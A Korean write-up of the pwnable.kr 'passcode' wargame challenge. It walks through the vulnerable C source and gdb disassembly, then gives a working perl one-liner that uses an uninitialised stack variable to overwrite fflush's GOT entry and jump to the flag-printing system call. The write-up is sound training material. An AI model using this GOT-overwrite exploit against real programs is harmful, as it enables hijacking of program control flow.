# [Toddler's Bottle] passcode
passcode에서 제공하는 글을 확인해보자.
```
Mommy told me to make a passcode based login system.
My initial C code was compiled without any error!
Well, there was some compiler warning, but who cares about that?

ssh passcode@pwnable.kr -p2222 (pw:guest)
```
putty를 이용하여 주어진 주소로 접속을 하자.

이번에는 `flag` `passcod` `passcode.c`가 존재하고있다.
```
passcode@ubuntu:~$ ls
flag  passcode  passcode.c
```

그동안 해왔던대로 `passcode.c`를 열어보자.
```
#include <stdio.h>
#include <stdlib.h>

void login(){
        int passcode1;
        int passcode2;

        printf("enter passcode1 : ");
        scanf("%d", passcode1);
        fflush(stdin);

        // ha! mommy told me that 32bit is vulnerable to bruteforcing :)
        printf("enter passcode2 : ");
        scanf("%d", passcode2);

        printf("checking...\n");
        if(passcode1==338150 && passcode2==13371337){
                printf("Login OK!\n");
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
                exit(0);
        }
}

void welcome(){
        char name[100];
        printf("enter you name : ");
        scanf("%100s", name);
        printf("Welcome %s!\n", name);
}

int main(){
        printf("Toddler's Secure Login System 1.0 beta.\n");

        welcome();
        login();

        // something after login...
        printf("Now I can safely trust you that you have credential :)\n");
        return 0;
}
```

그리고 제공된 글에서 컴파일 도중 워닝이 떴다는 것을 언급해주었으므로  
따로 코드를 옮겨와서 컴파일 해준 결과
```
lv0@ubuntu:~$ gcc -o passcode passcode.c
passcode.c: In function ‘login’:
passcode.c:9:17: warning: format ‘%d’ expects argument of type ‘int *’, but argument 2 has type ‘int’ [-Wformat=]
         scanf("%d", passcode1);
                ~^
passcode.c:14:17: warning: format ‘%d’ expects argument of type ‘int *’, but argument 2 has type ‘int’ [-Wformat=]
         scanf("%d", passcode2);
                ~^
```
scanf 사용할때 &를 사용하여 변수의 주소를 불러와야하는데 __코드__ 에서는 변수자체를 입력해서 워닝이 떴음을 알 수 있었다.  
이렇게 변수자체를 입력해주면 변수에 들어있는 값을 주소로 인식을하고 %d로 저장하게된다.

```
(gdb) disass main
Dump of assembler code for function main:
   0x08048665 <+0>:     push   %ebp
   0x08048666 <+1>:     mov    %esp,%ebp
   0x08048668 <+3>:     and    $0xfffffff0,%esp
   0x0804866b <+6>:     sub    $0x10,%esp
   0x0804866e <+9>:     movl   $0x80487f0,(%esp)
   0x08048675 <+16>:    call   0x8048450 <puts@plt>
   0x0804867a <+21>:    call   0x8048609 <welcome>
   0x0804867f <+26>:    call   0x8048564 <login>
   0x08048684 <+31>:    movl   $0x8048818,(%esp)
   0x0804868b <+38>:    call   0x8048450 <puts@plt>
   0x08048690 <+43>:    mov    $0x0,%eax
   0x08048695 <+48>:    leave
   0x08048696 <+49>:    ret
End of assembler dump.
```
main함수를 디스어셈해서 본 결과  
welcome과 login은 서로 같은 ebp값을 갖게 됨을 알 수 있다.

```
(gdb) disass welcome
Dump of assembler code for function welcome:
   0x08048609 <+0>:     push   %ebp
   0x0804860a <+1>:     mov    %esp,%ebp
   0x0804860c <+3>:     sub    $0x88,%esp
   0x08048612 <+9>:     mov    %gs:0x14,%eax
   0x08048618 <+15>:    mov    %eax,-0xc(%ebp)
   0x0804861b <+18>:    xor    %eax,%eax
   0x0804861d <+20>:    mov    $0x80487cb,%eax
   0x08048622 <+25>:    mov    %eax,(%esp)
   0x08048625 <+28>:    call   0x8048420 <printf@plt>
   0x0804862a <+33>:    mov    $0x80487dd,%eax
   0x0804862f <+38>:    lea    -0x70(%ebp),%edx
   0x08048632 <+41>:    mov    %edx,0x4(%esp)
   0x08048636 <+45>:    mov    %eax,(%esp)
   0x08048639 <+48>:    call   0x80484a0 <__isoc99_scanf@plt>
   0x0804863e <+53>:    mov    $0x80487e3,%eax
   0x08048643 <+58>:    lea    -0x70(%ebp),%edx
   0x08048646 <+61>:    mov    %edx,0x4(%esp)
   0x0804864a <+65>:    mov    %eax,(%esp)
   0x0804864d <+68>:    call   0x8048420 <printf@plt>
   0x08048652 <+73>:    mov    -0xc(%ebp),%eax
   0x08048655 <+76>:    xor    %gs:0x14,%eax
   0x0804865c <+83>:    je     0x8048663 <welcome+90>
   0x0804865e <+85>:    call   0x8048440 <__stack_chk_fail@plt>
   0x08048663 <+90>:    leave
   0x08048664 <+91>:    ret

```
welcome함수를 disass해서 본 결과   
scanf의 시작주소가 `-0x70(%ebp)`위치에 존재함을 알 수 있다.
그리고 c코드를 봤을때  
`char name[100];`   
이름은 100바이트 공간을 차지하므로 입력한 이름은 `-0x70(%ebp) ~ -0xc(%ebp)`에 존재한다.
```
(gdb) disass login
Dump of assembler code for function login:
   0x08048564 <+0>:     push   %ebp
   0x08048565 <+1>:     mov    %esp,%ebp
   0x08048567 <+3>:     sub    $0x28,%esp
   0x0804856a <+6>:     mov    $0x8048770,%eax
   0x0804856f <+11>:    mov    %eax,(%esp)
   0x08048572 <+14>:    call   0x8048420 <printf@plt>
   0x08048577 <+19>:    mov    $0x8048783,%eax
   0x0804857c <+24>:    mov    -0x10(%ebp),%edx
   0x0804857f <+27>:    mov    %edx,0x4(%esp)
   0x08048583 <+31>:    mov    %eax,(%esp)
   0x08048586 <+34>:    call   0x80484a0 <__isoc99_scanf@plt>
   0x0804858b <+39>:    mov    0x804a02c,%eax
   0x08048590 <+44>:    mov    %eax,(%esp)
   0x08048593 <+47>:    call   0x8048430 <fflush@plt>
   0x08048598 <+52>:    mov    $0x8048786,%eax
   0x0804859d <+57>:    mov    %eax,(%esp)
   0x080485a0 <+60>:    call   0x8048420 <printf@plt>
   0x080485a5 <+65>:    mov    $0x8048783,%eax
   0x080485aa <+70>:    mov    -0xc(%ebp),%edx
   0x080485ad <+73>:    mov    %edx,0x4(%esp)
   0x080485b1 <+77>:    mov    %eax,(%esp)
   0x080485b4 <+80>:    call   0x80484a0 <__isoc99_scanf@plt>
   0x080485b9 <+85>:    movl   $0x8048799,(%esp)
   0x080485c0 <+92>:    call   0x8048450 <puts@plt>
   0x080485c5 <+97>:    cmpl   $0x528e6,-0x10(%ebp)
   0x080485cc <+104>:   jne    0x80485f1 <login+141>
   0x080485ce <+106>:   cmpl   $0xcc07c9,-0xc(%ebp)
   0x080485d5 <+113>:   jne    0x80485f1 <login+141>
   0x080485d7 <+115>:   movl   $0x80487a5,(%esp)
   0x080485de <+122>:   call   0x8048450 <puts@plt>
   0x080485e3 <+127>:   movl   $0x80487af,(%esp)
   0x080485ea <+134>:   call   0x8048460 <system@plt>
   0x080485ef <+139>:   leave
   0x080485f0 <+140>:   ret
   0x080485f1 <+141>:   movl   $0x80487bd,(%esp)
   0x080485f8 <+148>:   call   0x8048450 <puts@plt>
   0x080485fd <+153>:   movl   $0x0,(%esp)
   0x08048604 <+160>:   call   0x8048480 <exit@plt>
```
그리고 login함수를 disass해본 결과  
scanf는 `-0x10(%ebp)`위치의 값을 인자로 불러오게 되고 fflush로 입력버퍼를 초기화해준다.  
그러나 passcode1은 초기화 전이므로 welcome함수의 name값과 버퍼 공간을 공유하게되고  
이름입력시 마지막 4바이트를 이용하여 passcode1을 변조시킬 수 있다.


여기서는 GOT와 PLT를 알아야하는데, 위에 사용자 정의 함수가 아닌 라이브러리 함수는 뒤에 @plt라고 써있는 걸 볼 수 있다.  
즉, 라이브러리 함수를 호출하면 PLT가 호출되고, GOT로 점프한다.

첫 번째 호출의 경우, GOT에 함수의 주소가 저장되어 있지 않아서 다시 PLT+6으로 돌아가서 dl_resolve를 통해서 함수의 주소를 GOT에 저장하고 함수로 점프한다.  
하지만 그 후로는 이미 함수의 주소가 GOT에 저장되어 있어서 PLT -> GOT -> 함수 이렇게 바로 점프하게 된다.  
그런데 GOT에 다른 주소가 쓰여 있다면, 함수를 실행했을 때, 다른 곳으로 점프하게 된다.  
> 출처 : https://bpsecblog.wordpress.com/2016/03/07/about_got_plt_1/

이것을 이용해보자.
```
(gdb) x/3i 0x8048430
   0x8048430 <fflush@plt>:      jmp    *0x804a004
   0x8048436 <fflush@plt+6>:    push   $0x8
   0x804843b <fflush@plt+11>:   jmp    0x8048410
(gdb) x/x 0x804a004
0x804a004 <fflush@got.plt>:     0x08048436
```
fflush 함수의 got 주소를 확인해보면 `0x804a004`임을 확인 할 수 있으며  
system(“/bin/cat flag”)의 주소는 login+127에서 `0x080485e3`임을 확인 할 수 있다.

그러나 scanf는 %d로 입력받으므로 system(“/bin/cat flag”)의 주소는 10진수로 입력해주어야 한다.
```
passcode@ubuntu:~$ (perl -e 'print "a"x96,"\x04\xa0\x04\x08","134514147"')|./passcode
Toddler's Secure Login System 1.0 beta.
enter you name : Welcome aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!
Sorry mom.. I got confused about scanf usage :(
enter passcode1 : Now I can safely trust you that you have credential :)
```
